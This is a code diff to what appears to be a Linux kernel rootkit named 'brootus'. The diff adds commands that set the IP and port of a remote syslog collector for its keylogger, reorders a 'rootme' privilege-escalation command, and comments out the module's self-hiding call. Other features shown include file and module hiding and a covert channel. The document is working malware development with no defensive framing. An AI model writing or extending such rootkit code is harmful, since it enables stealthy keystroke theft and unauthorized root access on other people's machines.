@@ -31,6 +31,13 @@ CMD_DELEGATE_ARG(hide_module, &__this_module);
 CMD_DELEGATE_ARG(unhide_module, &__this_module);
 CMD_DELEGATE(root_me);
 
+void cmd_set_syslog_port(char* port_str)
+{
+	unsigned short port;
+	sscanf(port_str, "%hu", &port);
+	set_syslog_port(port);
+}
+
 int __init init(void)
 {
 	// Setup the commands
@@ -57,9 +64,11 @@ int __init init(void)
 	add_command("hidemod", set_module_hidden);
 	add_command("showmod", set_module_visible);
 
-	add_command("rootme", cmd_root_me);
+	// Configure keylogger/syslog
+	add_command("syslog_ip", set_syslog_ip);
+	add_command("syslog_port", cmd_set_syslog_port);
 
-	add_command("syslog_ip", connect_keylogger);
+	add_command("rootme", cmd_root_me);
 
 	// Initialize the brootus modules
 	init_file_hiding();
@@ -69,7 +78,7 @@ int __init init(void)
 	init_keylogger();
 
 	// Hide our module
-	hide_module(&__this_module);
+	// hide_module(&__this_module);
 
   // Establish the covert channnel
 	init_vt_channel();
